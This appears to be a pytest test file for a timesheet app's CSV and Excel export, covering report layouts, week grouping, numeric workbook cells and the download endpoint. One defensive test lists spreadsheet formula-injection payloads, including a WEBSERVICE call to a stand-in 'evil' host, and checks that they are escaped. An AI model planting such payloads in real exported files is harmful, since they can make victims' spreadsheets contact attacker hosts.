"""Tests for the CSV/Excel export path."""

import csv
import io
from datetime import date, datetime, timezone

import pytest
from openpyxl import load_workbook
from sqlalchemy import event
from sqlalchemy.orm import Session

from app.core.db import get_db
from app.main import app
from app.models import Issue, Worklog
from app.services.export_service import build_csv, build_xlsx
from app.services.timesheet_service import get_all_issue_totals
from tests.conftest import build_sqlite_engine
from tests.asgi_client import ASGITestClient


def _sqlite_date_trunc(unit: str, value: str) -> str:
    """Minimal stand-in for Postgres' date_trunc('week', ...) on SQLite."""
    if unit != "week":
        raise NotImplementedError(unit)
    d = date.fromisoformat(value)
    monday = d.fromordinal(d.toordinal() - d.weekday())
    return monday.isoformat()


def _register_date_trunc(engine):
    @event.listens_for(engine, "connect")
    def _register(dbapi_connection, _):
        dbapi_connection.create_function("date_trunc", 2, _sqlite_date_trunc)


@pytest.fixture
def engine(monkeypatch):
    eng = build_sqlite_engine(monkeypatch, on_create=_register_date_trunc)
    yield eng
    eng.dispose()


@pytest.fixture
def db(engine):
    with Session(engine, autoflush=False) as session:
        yield session


@pytest.fixture
def client(engine):
    def override_get_db():
        with Session(engine, autoflush=False) as session:
            yield session

    app.dependency_overrides[get_db] = override_get_db
    yield ASGITestClient(app)
    app.dependency_overrides.clear()


def _dt(s: str) -> datetime:
    return datetime.fromisoformat(s).replace(tzinfo=timezone.utc)


def _issue(db, issue_id, key, summary="Summary", project_key="IN"):
    db.add(
        Issue(
            id=issue_id,
            key=key,
            project_key=project_key,
            summary=summary,
            updated_at=_dt("2026-01-01T00:00:00"),
        )
    )


def _worklog(db, wl_id, issue_id, account_id, display_name, seconds, work_date):
    db.add(
        Worklog(
            id=wl_id,
            issue_id=issue_id,
            author_account_id=account_id,
            author_display_name=display_name,
            time_spent_seconds=seconds,
            started=_dt("2026-01-01T09:00:00"),
            started_utc_offset=0,
            work_date=work_date,
            updated_at=_dt("2026-01-01T09:00:00"),
        )
    )


@pytest.fixture
def seeded(db):
    """Two authors, two issues, spanning 2026-03-02 (Mon) and 2026-03-03 (Tue).

    Ada:  IN-1 1h on Mon, IN-1 0.5h on Tue, IN-2 2h on Mon  -> 3h Mon, 0.5h Tue
    Bob:  IN-1 1.5h on Tue                                   -> 0h Mon, 1.5h Tue
    """
    _issue(db, "1", "IN-1", "Fix login")
    _issue(db, "2", "IN-2", "Upgrade db", project_key="OPS")
    _worklog(db, "w1", "1", "acct-ada", "Ada", 3600, date(2026, 3, 2))
    _worklog(db, "w2", "1", "acct-ada", "Ada", 1800, date(2026, 3, 3))
    _worklog(db, "w3", "2", "acct-ada", "Ada", 7200, date(2026, 3, 2))
    _worklog(db, "w4", "1", "acct-bob", "Bob", 5400, date(2026, 3, 3))
    db.commit()
    return db


def _parse(blob: str) -> list[list[str]]:
    return list(csv.reader(io.StringIO(blob)))


def test_matrix_csv_has_totals_row_and_column(seeded):
    rows = _parse(build_csv(seeded, "matrix", date(2026, 3, 1), date(2026, 3, 8), "day"))

    assert rows[0] == ["Author", "2026-03-02", "2026-03-03", "Total"]
    assert rows[1] == ["Ada", "3.0", "0.5", "3.5"]
    assert rows[2] == ["Bob", "0.0", "1.5", "1.5"]
    assert rows[3] == ["Total", "3.0", "2.0", "5.0"]


def test_matrix_csv_fills_zero_for_missing_author_period(seeded):
    rows = _parse(build_csv(seeded, "matrix", date(2026, 3, 1), date(2026, 3, 8), "day"))

    bob = next(row for row in rows if row[0] == "Bob")
    # Bob logged nothing on 2026-03-02.
    assert bob[1] == "0.0"


def test_raw_csv_has_one_row_per_cell_sorted(seeded):
    rows = _parse(build_csv(seeded, "raw", date(2026, 3, 1), date(2026, 3, 8), "day"))

    assert rows[0] == ["Author", "Account ID", "Period", "Hours"]
    assert rows[1:] == [
        ["Ada", "acct-ada", "2026-03-02", "3.0"],
        ["Ada", "acct-ada", "2026-03-03", "0.5"],
        ["Bob", "acct-bob", "2026-03-03", "1.5"],
    ]


def test_issues_csv_groups_per_author_per_issue(seeded):
    rows = _parse(build_csv(seeded, "issues", date(2026, 3, 1), date(2026, 3, 8), "day"))

    assert rows[0] == [
        "Author",
        "Account ID",
        "Issue Key",
        "Issue Summary",
        "Project Key",
        "Hours",
        "Worklogs",
    ]
    assert rows[1:] == [
        # Ada logged twice to IN-1 (1h + 0.5h) and once to IN-2 (2h).
        ["Ada", "acct-ada", "IN-1", "Fix login", "IN", "1.5", "2"],
        ["Ada", "acct-ada", "IN-2", "Upgrade db", "OPS", "2.0", "1"],
        # Bob shares IN-1 with Ada but is counted separately.
        ["Bob", "acct-bob", "IN-1", "Fix login", "IN", "1.5", "1"],
    ]


def test_week_grouping_collapses_days_into_one_column(seeded):
    rows = _parse(build_csv(seeded, "matrix", date(2026, 3, 1), date(2026, 3, 8), "week"))

    # Both days fall in the ISO week starting Monday 2026-03-02.
    assert rows[0] == ["Author", "2026-03-02", "Total"]
    assert rows[1] == ["Ada", "3.5", "3.5"]
    assert rows[2] == ["Bob", "1.5", "1.5"]


def test_empty_range_returns_header_only_csv(seeded):
    rows = _parse(build_csv(seeded, "matrix", date(2020, 1, 1), date(2020, 1, 2), "day"))

    assert rows[0] == ["Author", "Total"]
    assert rows[1] == ["Total", "0"]


def test_xlsx_has_three_sheets_with_numeric_hours_and_summary(seeded):
    wb = load_workbook(io.BytesIO(build_xlsx(seeded, date(2026, 3, 1), date(2026, 3, 8), "day")))

    assert wb.sheetnames == ["Matrix", "Raw", "Issues"]

    matrix = list(wb["Matrix"].iter_rows(values_only=True))
    assert matrix[0] == ("Author", "2026-03-02", "2026-03-03", "Total")
    # Hours must be numbers, not strings, so Excel can sum them.
    ada = matrix[1]
    assert ada[0] == "Ada"
    assert all(isinstance(v, (int, float)) for v in ada[1:])
    assert ada[1] == 3.0 and ada[2] == 0.5 and ada[3] == 3.5

    summary = {row[0]: row[1] for row in matrix if row[0] in {
        "Total hours", "Author count", "Issue count", "Avg hours / author"
    }}
    assert summary == {
        "Total hours": 5.0,
        "Author count": 2,
        "Issue count": 2,
        "Avg hours / author": 2.5,
    }


def test_get_all_issue_totals_aggregates_and_orders(seeded):
    totals = get_all_issue_totals(seeded, date(2026, 3, 1), date(2026, 3, 8))

    assert [(t["author_display_name"], t["issue_key"], t["total_seconds"], t["worklog_count"])
            for t in totals] == [
        ("Ada", "IN-1", 5400, 2),
        ("Ada", "IN-2", 7200, 1),
        ("Bob", "IN-1", 5400, 1),
    ]


@pytest.mark.parametrize("payload", ['=WEBSERVICE("http://evil")', "+1+1", "-2-2", "@SUM(A1)"])
def test_formula_injection_is_neutralized_in_csv_and_xlsx(db, payload):
    """A Jira issue summary is attacker-controlled and must not become a formula."""
    _issue(db, "1", "IN-1", payload)
    _worklog(db, "w1", "1", "acct-ada", "Ada", 3600, date(2026, 3, 2))
    db.commit()

    rows = _parse(build_csv(db, "issues", date(2026, 3, 1), date(2026, 3, 8), "day"))
    assert rows[1][3] == "'" + payload

    wb = load_workbook(io.BytesIO(build_xlsx(db, date(2026, 3, 1), date(2026, 3, 8), "day")))
    summary_cell = list(wb["Issues"].iter_rows(values_only=True))[1][3]
    assert summary_cell == "'" + payload


def test_export_endpoint_csv_sets_download_headers(client, seeded):
    resp = client.get(
        "/api/timesheets/export",
        params={"from": "2026-03-01", "to": "2026-03-08", "group": "day", "format": "csv"},
    )

    assert resp.status_code == 200
    assert resp.headers["content-type"].startswith("text/csv")
    assert (
        resp.headers["content-disposition"]
        == 'attachment; filename="timesheets-2026-03-01-to-2026-03-08-matrix.csv"'
    )
    assert _parse(resp.text)[0] == ["Author", "2026-03-02", "2026-03-03", "Total"]


def test_export_endpoint_respects_dataset_param(client, seeded):
    resp = client.get(
        "/api/timesheets/export",
        params={
            "from": "2026-03-01",
            "to": "2026-03-08",
            "group": "day",
            "format": "csv",
            "dataset": "issues",
        },
    )

    assert resp.status_code == 200
    assert _parse(resp.text)[0][0:3] == ["Author", "Account ID", "Issue Key"]


def test_export_endpoint_xlsx_returns_valid_workbook(client, seeded):
    resp = client.get(
        "/api/timesheets/export",
        params={"from": "2026-03-01", "to": "2026-03-08", "group": "day", "format": "xlsx"},
    )

    assert resp.status_code == 200
    assert resp.headers["content-type"] == (
        "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
    )
    assert (
        resp.headers["content-disposition"]
        == 'attachment; filename="timesheets-2026-03-01-to-2026-03-08.xlsx"'
    )
    assert load_workbook(io.BytesIO(resp.content)).sheetnames == ["Matrix", "Raw", "Issues"]


def test_export_endpoint_empty_range_is_not_an_error(client, seeded):
    for export_format in ("csv", "xlsx"):
        resp = client.get(
            "/api/timesheets/export",
            params={
                "from": "2020-01-01",
                "to": "2020-01-02",
                "group": "day",
                "format": export_format,
            },
        )
        assert resp.status_code == 200
